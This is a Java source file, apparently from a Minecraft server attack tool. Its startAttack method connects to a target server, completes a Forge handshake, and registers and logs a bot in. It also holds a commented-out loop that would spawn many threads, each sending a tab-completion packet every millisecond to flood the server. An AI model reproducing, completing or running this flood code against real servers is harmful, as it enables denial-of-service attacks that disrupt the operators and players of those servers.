package me.alikomi.endminecraft.tasks.attack;

import lombok.AllArgsConstructor;
import me.alikomi.endminecraft.tasks.attack.forge.ForgeHandShake;
import me.alikomi.endminecraft.tasks.attack.forge.GetModList;
import me.alikomi.endminecraft.tasks.attack.utils.Attack_util;
import me.alikomi.endminecraft.utils.Util;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerChatPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerPluginMessagePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import java.lang.reflect.InvocationTargetException;

@AllArgsConstructor
public class TabWithOneIp extends Util {

    private  String ip;
    private  int port;
    private  int thread;
    private  String username;

    public void startAttack() {
        MinecraftProtocol mc = new MinecraftProtocol(username);
        Client client = new Client(ip, port, mc, new TcpSessionFactory());
        ForgeHandShake forgeHandShake = new ForgeHandShake(client, new GetModList(ip,port).get());
        client.getSession().addListener(new SessionListener() {
            @Override
            public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
                Object pack = packetReceivedEvent.getPacket();
                log("收到：     " + packetReceivedEvent.getPacket().getClass().getName());
                if (pack instanceof ServerPluginMessagePacket) {
                    try {
                        forgeHandShake.start((ServerPluginMessagePacket)pack);
                    } catch (InvocationTargetException | NoSuchMethodException | NoSuchFieldException | IllegalAccessException e) {
                        e.printStackTrace();
                    }
                }

                if (pack instanceof ServerJoinGamePacket) {
                    log("进入服务器！");
                    Attack_util.regAndLogin(client);
                    for (int i = 0; i < thread; i++) {
//                        new Thread(() -> {
//                            while (client.getSession().isConnected()) {
//                                client.getSession().send(new ClientTabCompletePacket("/"));
//                                try {
//                                    Thread.sleep(1);
//                                } catch (InterruptedException e) {
//                                    e.printStackTrace();
//                                }
//                            }
//                        }).start();
                    }
                }
                if (pack instanceof ServerChatPacket) {
                    log("聊天：" + ((ServerChatPacket) pack).getMessage().getFullText());
                }
            }

            @Override
            public void packetSent(PacketSentEvent packetSentEvent) {
                log("发送： " + packetSentEvent.getPacket().getClass().getName());
            }

            @Override
            public void connected(ConnectedEvent connectedEvent) {

            }

            @Override
            public void disconnecting(DisconnectingEvent disconnectingEvent) {

            }

            @Override
            public void disconnected(DisconnectedEvent disconnectedEvent) {
                String msg = disconnectedEvent.getReason();
                if (msg.contains("refused") || msg.contains("here")) return;
                Throwable t = disconnectedEvent.getCause();
                log("用户 " + mc.getProfile().getName() + "断开连接： " + msg + (t == null ? "" : t.toString()));
            }
        });
        client.getSession().connect();
    }
}